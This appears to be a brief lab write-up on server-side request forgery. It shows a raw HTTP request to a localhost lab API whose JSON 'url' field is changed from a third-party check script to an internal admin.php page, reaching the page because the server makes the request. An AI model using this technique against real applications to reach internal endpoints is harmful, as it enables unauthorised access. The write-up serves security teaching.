If an application utilizes a mechanism to check for data, if we can make it perform those checks to a point of interest we get SSRF.

By changing
```
POST /labs/api/vendors_0x01.php HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://localhost/labs/s0x01.php

Content-Type: application/json

Content-Length: 61

Origin: http://localhost

Connection: close

Cookie: admin_cookie=5ac5355b84894ede056ab81b324c4675; csrf0x01=jeremy; csrf0x02=jeremy

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin



{"url":"http://localhost/labs/api/thirdparty/checkmeout.php"}
```

To
```
POST /labs/api/vendors_0x01.php HTTP/1.1

Host: localhost

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://localhost/labs/s0x01.php

Content-Type: application/json

Content-Length: 61

Origin: http://localhost

Connection: close

Cookie: admin_cookie=5ac5355b84894ede056ab81b324c4675; csrf0x01=jeremy; csrf0x02=jeremy

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin



{"url":"http://localhost/labs/api/admin.php"}
```

We get access to admin.php, because its' the application making the request, not the user.